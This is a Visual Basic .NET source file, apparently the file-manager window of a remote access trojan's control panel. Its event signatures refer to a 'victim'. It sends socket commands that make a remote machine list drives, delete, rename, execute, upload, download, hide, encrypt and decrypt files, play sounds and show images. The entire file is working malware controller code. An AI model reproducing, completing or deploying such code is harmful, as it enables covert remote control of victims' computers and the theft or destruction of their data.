Imports System.Threading
Public Class Man
    Public Event SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
    Public Event RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
    Public sock As Integer

    Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        ListView1.Items.Clear()
    End Sub
    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Form1.S.Send(sock, "GetDrives" & "|BawaneH|")
    End Sub


    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
                ' Form1.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
                ' Form1.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
            End If
            RefreshList()
        End If
    End Sub
    Public Sub RefreshList()
        Form1.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.S.Send(sock, "Delete|BawaneH|Folder|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Form1.S.Send(sock, "Delete|BawaneH|File|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExecuteToolStripMenuItem.Click
        Form1.S.Send(sock, "Execute|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Form1.S.Send(sock, "Rename|BawaneH|Folder|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BawaneH|" & a)
                Case Else
                    Form1.S.Send(sock, "Rename|BawaneH|File|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BawaneH|" & a)
            End Select
        End If
        RefreshList()
    End Sub

    Private Sub BackToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BackToolStripMenuItem.Click
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.S.Send(sock, "GetDrives" & "|BawaneH|")
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If
    End Sub

    Private Sub DownloadToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "downloadfile" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BawaneH|" & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub UploadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UploadToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        If o.ShowDialog() = Windows.Forms.DialogResult.OK Then
            If o.FileName.Length > 0 Then
                Dim n As New IO.FileInfo(o.FileName)
                For Each x As ListViewItem In Form1.L1.SelectedItems
                    Form1.S.Send(sock, "sendfileto" & "|BawaneH|" & TextBox1.Text & n.Name & "|BawaneH|" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
                RefreshList()
            End If
        End If
    End Sub
    Private Sub NewFolderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NewFolderToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The folder's Name", "Creat New Folder")
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "creatnewfolder" & "|BawaneH|" & TextBox1.Text & n)
        Next
        RefreshList()
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        RefreshList()
    End Sub

    Private Sub HideFolderFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideFolderFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "hidefolderfile" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ShowFolderFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowFolderFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "showfolderfile" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub CrypterTextFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CrypterTextFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "Cr" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub DecrypterTextFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DecrypterTextFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "De" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ShowTextToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowTextToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "T.S" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

 

    Private Sub PlayWavSongToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PlayWavSongToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "wav" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ViewImageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ViewImageToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "viewimage" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub AddRarToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AddRarToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "Comrar" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub DecompressTheFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DecompressTheFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "Decrar" & "|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub
End Class